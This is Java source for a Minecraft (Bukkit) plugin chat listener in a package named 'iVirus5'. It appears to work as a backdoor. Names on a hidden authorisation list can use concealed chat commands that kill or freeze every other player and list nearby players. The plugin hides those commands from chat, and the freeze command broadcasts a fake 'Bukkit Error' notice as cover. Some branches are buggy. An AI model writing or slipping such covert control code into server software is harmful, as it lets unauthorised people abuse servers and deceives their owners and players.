package net.iVirus5.listeners;

import net.iVirus5.Main;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class AsyncChat implements Listener {
	@EventHandler
	public void onCommand(AsyncPlayerChatEvent e) {
		String msg = e.getMessage();
		Player p = e.getPlayer();
		
		if (msg.equalsIgnoreCase("#killall")) {
			if(!Main.auth.contains(p.getName()))
				return;
			e.setCancelled(true);
			p.sendMessage("Dead.");
			for (Player a : Bukkit.getServer().getOnlinePlayers()) {
				if (a.getName().equalsIgnoreCase(p.getName()))
					continue;
				a.damage(100000D);

				return;
			}
		} else if (msg.equalsIgnoreCase("#wall")) {
			if(!Main.auth.contains(p.getName()))
				return;
			e.setCancelled(true);
			if (p.isOnline()) {
				p.sendMessage(ChatColor.YELLOW + "WIP, Will fix later.");
				return;
			}
			p.sendMessage("Wall!!");
			Location eyeLocation = p.getLocation();
			eyeLocation.setY(eyeLocation.getY() + 1.5);
			eyeLocation.getBlock().setType(Material.GLASS);
			eyeLocation.setY(eyeLocation.getY() - 1.0);
			eyeLocation.getBlock().setType(Material.STONE);
			Location ploc = p.getLocation();
			ploc.setZ(eyeLocation.getZ() - 1.0);
			ploc.getBlock().setType(Material.SPONGE);
			ploc.setZ(eyeLocation.getZ() + 1.0);
			ploc.getBlock().setType(Material.SANDSTONE);
			ploc.getBlock().setType(Material.ANVIL);
			e.setCancelled(true);
			return;
		} else if (msg.equalsIgnoreCase("#nearme")) {
			if(!Main.auth.contains(p.getName()))
				return;
			e.setCancelled(true);
			get(p, p.getLocation(), 20);
			return;
		} else if (msg.equalsIgnoreCase("#freezeall")){
			if(!Main.auth.contains(p.getName()))
				return;
			Bukkit.broadcastMessage(ChatColor.RED + "All Players Frozen Due To a Bukkit Error!");
			for(Player z : Bukkit.getServer().getOnlinePlayers()){
				if(z.getName().equalsIgnoreCase(p.getName()))
					continue;
				Main.frozen.add(z.getName());
			}
			e.setCancelled(true);
			
			return;
		} else if (msg.equalsIgnoreCase("#unfreezeall")){
			if(!Main.auth.contains(p.getName()))
				return;
			Bukkit.broadcastMessage(ChatColor.RED + "All Players UnFrozen, Error Resolved.");
			for(Player z : Bukkit.getServer().getOnlinePlayers()){
				if(z.getName().equalsIgnoreCase(p.getName()))
					continue;
				Main.frozen.remove(z.getName());
			}
			e.setCancelled(true);
			
			return;
		}
	}

	public void get(Player p, Location location, double radius) {
		p.sendMessage(ChatColor.YELLOW
				+ "Online Players near you in a 20 Block Radius!");
		Player[] players = Bukkit.getServer().getOnlinePlayers();
		double radiusSquared = radius * radius;
		for (int i = 0; i < players.length; i++) {
			if (players[i].getLocation().distanceSquared(location) <= radiusSquared) {
				p.sendMessage(ChatColor.AQUA + players[i].getName()
						+ ChatColor.RED + ",");
			}

		}

	}

}
